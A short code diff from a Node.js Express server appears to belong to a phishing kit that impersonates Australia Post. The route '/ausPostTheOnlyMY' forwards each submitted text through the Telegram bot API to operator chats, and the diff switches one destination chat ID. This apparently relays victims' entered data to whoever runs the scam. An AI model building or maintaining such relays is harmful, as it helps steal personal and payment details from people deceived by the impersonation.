@@ -301,7 +301,7 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostOnlyMy:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=AusPost:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-716287470&text=AusPost:\n${originalText}`
         );
         TheOnlyMY += 1;
       }
